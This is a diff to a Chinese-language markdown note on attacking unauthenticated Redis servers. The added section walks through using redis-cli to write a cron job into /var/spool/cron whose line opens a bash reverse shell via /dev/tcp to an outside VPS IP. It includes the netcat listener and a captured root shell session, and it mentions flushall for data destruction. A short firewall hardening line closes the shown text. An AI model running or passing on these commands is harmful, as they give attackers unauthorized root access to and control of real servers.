@@ -14,6 +14,34 @@
 > redis-cli -h 192.168.1.30 save
 再登陆测试　ssh root@192.168.1.30
 
+### 　利用redis 反弹shell
+
+- １　redis 非root 启动无权限　
+这时候最多搞点数据破坏　flushall 
+对其他操作基本上没有权限
+dh@dh-pc ~ $ redis-cli -h 192.168.1.30 config set dir /var/spool/cron
+(error) ERR Changing directory: Permission denied
+dh@dh-pc ~ $ redis-cli -h 192.168.1.30
+192.168.1.30:6379> config set dir /var/spool/cron
+(error) ERR Changing directory: Permission denied
+
+- 2	redis root 启动有权限（centos 系列会反弹成功，debian 系列不会成功）
+登陆vps:  nc -lvvp 22222 
+开始操作
+redis-cli -h 192.168.1.30 -p 6379 config set dir /var/spool/cron
+redis-cli -h 192.168.1.30 -p 6379 config set dbfilename root
+echo -e "\n\n\n* * * * * /bin/bash -i >& /dev/tcp/52.221.230.100/22222 0>&1\n\n\n" | redis-cli -h 192.168.1.30 -p 6379 -x set 1
+redis-cli -h 192.168.1.30 -p 6379 save || redis-cli -h 192.168.1.30 -p 6379 bgsave 
+
+- 然后观察刚刚登陆的vps终端
+ubuntu@ip-172-31-31-79:~$ nc -lvvp 22222
+Listening on [0.0.0.0] (family 0, port 22222)
+Connection from [211.144.0.242] port 22222 [tcp/*] accepted (family 2, sport 33096)
+[root@vv30-cimhealth ~]# 
+[root@vv30-cimhealth ~]# ls
+30iptables
+anaconda-ks.cfg
+
 ## 3 防御策略
 >安全加固
 1 防火墙　iptables -I INPUT -p TCP  --destination-port 6379 -s 192.168.0.0/16 -j ACCEPT
